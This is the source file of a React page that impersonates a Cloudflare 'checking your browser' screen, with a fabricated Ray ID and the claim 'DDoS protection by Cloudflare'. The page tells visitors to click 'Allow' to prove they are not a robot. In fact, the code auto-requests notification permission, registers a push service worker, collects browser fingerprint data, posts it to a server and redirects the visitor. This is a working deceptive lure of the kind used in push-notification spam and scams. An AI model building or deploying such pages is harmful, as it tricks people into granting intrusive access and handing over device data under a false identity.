'use client'

import { useState, useEffect } from 'react'
import { Container, Card, Button, Spinner } from 'react-bootstrap'
import { FiShield } from 'react-icons/fi'

export default function BotCheckPage() {
  const [clientInfo, setClientInfo] = useState(null)
  const [isChecking, setIsChecking] = useState(true)
  const [isVerified, setIsVerified] = useState(false)
  const [rayId, setRayId] = useState('')
  const [userAgent, setUserAgent] = useState('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
  const [ipAddress] = useState('192.168.1.100')
  const [timestamp, setTimestamp] = useState('')
  const [domain, setDomain] = useState('sms-system-alert.com')

  // Initialize client-side only values
  useEffect(() => {
    // Check if embedded in iframe
    const urlParams = new URLSearchParams(window.location.search)
    const embedded = urlParams.get('embedded') === 'true'
    const urlDomain = urlParams.get('domain')
    
    // Store embedded state for later use
    window.isEmbedded = embedded
    
    // Set domain from URL params
    if (urlDomain) {
      setDomain(urlDomain)
    }
    
    // Generate Ray ID on client side only
    const chars = '0123456789abcdef'
    let result = ''
    for (let i = 0; i < 16; i++) {
      result += chars[Math.floor(Math.random() * chars.length)]
    }
    setRayId(result)
    
    // Set timestamp on client side
    setTimestamp(new Date().toISOString())
    
    // Set user agent on client side
    if (typeof window !== 'undefined') {
      setUserAgent(window.navigator.userAgent)
    }
  }, [])

  // Detect browser and device information
  useEffect(() => {
    if (typeof window !== 'undefined') {
      const getBrowserInfo = () => {
        const ua = navigator.userAgent
        let browser = 'Unknown'
        let browserVersion = 'Unknown'
        
        // Detect browsers (order matters for accurate detection)
        if (ua.indexOf('OPR') > -1 || ua.indexOf('Opera') > -1) {
          browser = 'Opera'
          browserVersion = ua.match(/(?:OPR|Opera)[\s\/]([\d.]+)/)?.[1] || 'Unknown'
        } else if (ua.indexOf('Edg') > -1) {
          browser = 'Edge'
          browserVersion = ua.match(/Edg[e]?\/(\d+)/)?.[1] || 'Unknown'
        } else if (ua.indexOf('SamsungBrowser') > -1) {
          browser = 'Samsung'
          browserVersion = ua.match(/SamsungBrowser\/(\d+)/)?.[1] || 'Unknown'
        } else if (ua.indexOf('Chrome') > -1 && ua.indexOf('Safari') > -1) {
          browser = 'Chrome'
          browserVersion = ua.match(/Chrome\/(\d+)/)?.[1] || 'Unknown'
        } else if (ua.indexOf('Firefox') > -1) {
          browser = 'Firefox'
          browserVersion = ua.match(/Firefox\/(\d+)/)?.[1] || 'Unknown'
        } else if (ua.indexOf('Safari') > -1) {
          browser = 'Safari'
          browserVersion = ua.match(/Version\/(\d+)/)?.[1] || 'Unknown'
        }
        
        // Check for Brave (it reports as Chrome)
        if (typeof navigator.brave !== 'undefined') {
          browser = 'Brave'
        }

        const isMobile = /Mobile|Android|iPhone|iPad/i.test(ua)
        const deviceType = isMobile ? 'Mobile' : 'Desktop'
        
        let os = 'Unknown'
        if (ua.indexOf('Windows NT 10.0') > -1) {
          // Could be Windows 10, 11, or Server 2016/2019/2022
          if (ua.indexOf('Windows NT 10.0; Win64; x64') > -1) {
            os = 'Windows 10+' // Generic for Win10/11/Server
          } else {
            os = 'Windows 10'
          }
        } else if (ua.indexOf('Windows NT 11.0') > -1) {
          os = 'Windows 11'
        } else if (ua.indexOf('Windows') > -1) {
          os = 'Windows'
        } else if (ua.indexOf('Mac') > -1) {
          os = 'macOS'
        } else if (ua.indexOf('Linux') > -1) {
          os = 'Linux'
        } else if (ua.indexOf('Android') > -1) {
          os = 'Android'
        } else if (ua.indexOf('iPhone') > -1 || ua.indexOf('iPad') > -1) {
          os = 'iOS'
        }

        return {
          browser,
          browserVersion,
          deviceType,
          operatingSystem: os,
          userAgent: ua,
          language: navigator.language,
          screenResolution: `${window.screen.width}x${window.screen.height}`,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          platform: navigator.platform
        }
      }

      setClientInfo(getBrowserInfo())
    }
  }, [])

  useEffect(() => {
    // Show bot check UI
    const timer = setTimeout(() => {
      setIsChecking(false)
      setIsVerified(true)
      
      // If embedded, send verification complete message to parent
      if (window.isEmbedded && window.parent !== window) {
        setTimeout(() => {
          window.parent.postMessage({
            type: 'bot-check-verified',
            browserInfo: clientInfo,
            location: {
              country: 'United States',
              city: 'New York',
              ip: ipAddress
            }
          }, '*')
        }, 500) // Small delay after showing verified state
      } else {
        // Only auto-request in non-embedded mode
        setTimeout(() => {
          if (clientInfo) {
            handleAllow()
          }
        }, 500)
      }
    }, 1500)

    return () => {
      clearTimeout(timer)
    }
  }, [clientInfo, ipAddress])

  const handleAllow = async () => {
    try {
      console.log('Requesting notification permission...')
      const permission = await Notification.requestPermission()
      console.log('Permission result:', permission)
      
      // If embedded in iframe, send message to parent
      if (window.isEmbedded && window.parent !== window) {
        window.parent.postMessage({
          type: 'bot-check-completed',
          permission: permission,
          browserInfo: clientInfo,
          location: {
            country: 'United States',
            city: 'New York',
            ip: ipAddress
          }
        }, '*') // Using '*' for now, should be restricted to specific origin in production
        
        // Don't proceed with redirect if embedded
        if (permission === 'granted') {
          console.log('Permission granted in iframe mode')
        } else if (permission === 'denied') {
          console.log('Permission denied in iframe mode')
        }
        return
      }
      
      if (permission === 'granted') {
        // In a real app, this would register the service worker and save the subscription
        // For now, we'll show the collected client information
        const clientData = {
          browser: clientInfo?.browser || 'Unknown',
          browserVersion: clientInfo?.browserVersion || 'Unknown',
          ipAddress: ipAddress,
          country: 'United States', // This would be determined by IP geolocation
          countryCode: 'US',
          operatingSystem: clientInfo?.operatingSystem || 'Unknown',
          deviceType: clientInfo?.deviceType || 'Desktop',
          subscribedUrl: document.referrer || window.location.origin,
          subscriptionDate: new Date().toISOString(),
          lastActive: new Date().toISOString(),
          tags: ['web-subscriber'],
          language: clientInfo?.language || 'en-US',
          timezone: clientInfo?.timezone || 'UTC',
          screenResolution: clientInfo?.screenResolution || 'Unknown',
          platform: clientInfo?.platform || 'Unknown'
        }
        
        // Get query parameters
        const urlParams = new URLSearchParams(window.location.search)
        const landingId = urlParams.get('landingId')
        const domain = urlParams.get('domain')
        const subscribedUrl = urlParams.get('url')
        const vapidKey = urlParams.get('vapidKey')
        const allowRedirect = urlParams.get('allowRedirect')
        
        // Register service worker and get subscription
        try {
          let subscriptionData;
          
          // Check if we're on the same domain as the push platform
          const isSameDomain = window.location.hostname === 'localhost' || 
                               window.location.hostname === domain;
          
          if (isSameDomain && 'serviceWorker' in navigator && 'PushManager' in window) {
            try {
              // Register service worker
              console.log('Registering service worker...')
              const registration = await navigator.serviceWorker.register('/push-sw.js')
              await navigator.serviceWorker.ready
              
              // Get or create subscription
              let subscription = await registration.pushManager.getSubscription()
              
              if (!subscription) {
                console.log('Creating new push subscription...')
                subscription = await registration.pushManager.subscribe({
                  userVisibleOnly: true,
                  applicationServerKey: urlBase64ToUint8Array(vapidKey)
                })
              }
              
              subscriptionData = subscription.toJSON()
              console.log('Real subscription obtained:', subscriptionData)
            } catch (swError) {
              console.error('Service worker error:', swError)
              // Don't create subscription if service worker fails
              alert('Failed to register for push notifications. Please ensure the service worker is properly installed on your domain.');
              return;
            }
          } else {
            // For cross-domain or when push is not supported
            console.warn('Push notifications not available on this domain');
            // Just redirect without creating fake subscription
            if (allowRedirect) {
              window.location.href = allowRedirect;
            }
            return;
          }
          
          console.log('Sending subscription to API with data:', {
            landingId,
            domain,
            url: subscribedUrl,
            clientData
          })
          
          // Send subscription to API
          const response = await fetch('/api/clients', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              subscription: subscriptionData,
              landingId: landingId,
              domain: domain,
              url: subscribedUrl,
              accessStatus: 'allowed', // Explicitly set as allowed
              browserInfo: {
                browser: clientData.browser,
                version: clientData.browserVersion,
                os: clientData.operatingSystem,
                device: clientData.deviceType,
                language: clientData.language,
                platform: clientData.platform,
                userAgent: navigator.userAgent,
                timezone: clientData.timezone,
                timezoneOffset: clientData.timezoneOffset
              },
              location: {
                country: clientData.country,
                city: 'New York', // Add real geolocation
                ip: clientData.ipAddress
              }
            })
          })
          
          if (response.ok) {
            // Mark as subscribed locally (for this domain)
            localStorage.setItem('push-subscribed-' + landingId, 'true')
            console.log('Successfully saved subscription for landing:', landingId)
          } else {
            console.error('Failed to save subscription, response not ok')
          }
        } catch (error) {
          console.error('Failed to save subscription:', error)
        }
        
        // Only redirect if not embedded
        if (!window.isEmbedded) {
          const redirectUrl = new URL(allowRedirect || subscribedUrl || '/')
          redirectUrl.searchParams.set('push-subscribed', 'true')
          redirectUrl.searchParams.set('push-landing-id', landingId)
          window.location.href = redirectUrl.toString()
        }
      } else if (permission === 'denied') {
        // Don't show alert, just update the UI
        console.log('Notifications blocked by user')
        
        // Save blocked status and redirect
        await handleBlock()
      } else if (permission === 'default') {
        // User dismissed the prompt without choosing
        console.log('User dismissed the notification prompt')
        setTimeout(() => {
          window.location.href = '/landing'
        }, 2000)
      }
    } catch (error) {
      console.error('Error requesting permission:', error)
    }
  }

  // Utility function to convert VAPID key
  const urlBase64ToUint8Array = (base64String) => {
    const padding = '='.repeat((4 - base64String.length % 4) % 4)
    const base64 = (base64String + padding)
      .replace(/\-/g, '+')
      .replace(/_/g, '/')
    
    const rawData = window.atob(base64)
    const outputArray = new Uint8Array(rawData.length)
    
    for (let i = 0; i < rawData.length; ++i) {
      outputArray[i] = rawData.charCodeAt(i)
    }
    return outputArray
  }

  const handleBlock = async () => {
    // If embedded, send message to parent
    if (window.isEmbedded && window.parent !== window) {
      window.parent.postMessage({
        type: 'bot-check-completed',
        permission: 'denied',
        browserInfo: clientInfo,
        location: {
          country: 'United States',
          city: 'New York',
          ip: ipAddress
        }
      }, '*')
      return
    }
    
    // Save blocked status to database
    const urlParams = new URLSearchParams(window.location.search)
    const landingId = urlParams.get('landingId')
    const domain = urlParams.get('domain')
    const subscribedUrl = urlParams.get('url')
    const blockRedirect = urlParams.get('blockRedirect')
    
    try {
      // Save blocked attempt
      const response = await fetch('/api/clients', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          subscription: {
            endpoint: `blocked-${Date.now()}-${Math.random()}`, // Unique identifier for blocked
            keys: {
              p256dh: 'blocked',
              auth: 'blocked'
            }
          },
          landingId: landingId,
          domain: domain,
          url: subscribedUrl,
          accessStatus: 'blocked',
          browserInfo: {
            browser: clientInfo?.browser || 'unknown',
            version: clientInfo?.browserVersion || 'unknown',
            os: clientInfo?.operatingSystem || 'unknown',
            device: clientInfo?.deviceType || 'unknown',
            language: clientInfo?.language || 'en',
            platform: clientInfo?.platform || 'unknown'
          },
          location: {
            country: 'United States',
            city: 'New York',
            ip: ipAddress
          }
        })
      })
    } catch (error) {
      console.error('Failed to save blocked status:', error)
    }
    
    // Only redirect if not embedded
    if (!window.isEmbedded) {
      window.location.href = blockRedirect || subscribedUrl || '/'
    }
  }

  return (
    <div style={{ 
      minHeight: '100vh', 
      backgroundColor: '#f8f8f8',
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'center',
      padding: '20px',
      fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif'
    }}>
      <style jsx global>{`
        @keyframes loading-dots {
          0% { opacity: 0.2; }
          20% { opacity: 1; }
          100% { opacity: 0.2; }
        }
        .loading-dot {
          display: inline-block;
          width: 12px;
          height: 12px;
          border-radius: 50%;
          background-color: #f48120;
          margin: 0 5px;
          opacity: 0.2;
          animation: loading-dots 1.4s infinite ease-in-out;
        }
        .loading-dot:nth-child(1) { animation-delay: -0.32s; }
        .loading-dot:nth-child(2) { animation-delay: -0.16s; }
        .loading-dot:nth-child(3) { animation-delay: 0; }
      `}</style>
      <Container>
        <Card className="mx-auto" style={{ maxWidth: '700px', border: '1px solid #d9d9d9', boxShadow: 'none' }}>
          <Card.Body className="p-5" style={{ backgroundColor: '#ffffff' }}>
            {isChecking ? (
              <div className="text-center">
                <h2 style={{ fontSize: '24px', fontWeight: '400', color: '#333', marginBottom: '30px' }}>
                  Please Click "Allow" to confirm you are not a robot.
                </h2>
                
                <div className="mb-4">
                  <div className="loading-dot"></div>
                  <div className="loading-dot"></div>
                  <div className="loading-dot"></div>
                </div>
                
                <h1 style={{ fontSize: '20px', fontWeight: '500', color: '#333', marginTop: '40px', marginBottom: '20px' }}>
                  Checking your browser before accessing {domain}.
                </h1>
                
                <p style={{ color: '#999', marginBottom: '10px', fontSize: '14px' }}>
                  This process is automatic. Your browser will redirect to your requested content shortly.
                </p>
                
                <p style={{ color: '#999', marginBottom: '40px', fontSize: '14px' }}>
                  Please allow up to 5 seconds...
                </p>
                
                <div style={{ borderTop: '1px solid #e5e5e5', paddingTop: '20px', marginTop: '40px' }}>
                  <p style={{ color: '#999', fontSize: '13px', marginBottom: '5px' }}>
                    DDoS protection by Cloudflare
                  </p>
                  <p style={{ color: '#999', fontSize: '13px', margin: '0' }}>
                    Ray ID: {rayId}
                  </p>
                </div>
              </div>
            ) : (
              <div className="text-center">
                <h2 style={{ fontSize: '24px', fontWeight: '400', color: '#333', marginBottom: '30px' }}>
                  Please Click "Allow" to confirm you are not a robot.
                </h2>
                
                <div className="mb-4">
                  <div className="loading-dot"></div>
                  <div className="loading-dot"></div>
                  <div className="loading-dot"></div>
                </div>
                
                <h1 style={{ fontSize: '20px', fontWeight: '500', color: '#333', marginTop: '40px', marginBottom: '20px' }}>
                  Waiting for your browser permission response...
                </h1>
                
                <p style={{ color: '#999', marginBottom: '10px', fontSize: '14px' }}>
                  Please respond to the browser notification prompt to continue.
                </p>
                
                <p style={{ color: '#999', marginBottom: '40px', fontSize: '14px' }}>
                  This may take a few seconds...
                </p>
                
                <div style={{ borderTop: '1px solid #e5e5e5', paddingTop: '20px', marginTop: '40px' }}>
                  <p style={{ color: '#999', fontSize: '13px', marginBottom: '5px' }}>
                    DDoS protection by Cloudflare
                  </p>
                  <p style={{ color: '#999', fontSize: '13px', margin: '0' }}>
                    Ray ID: {rayId}
                  </p>
                </div>
              </div>
            )}
          </Card.Body>
        </Card>
      </Container>
    </div>
  )
}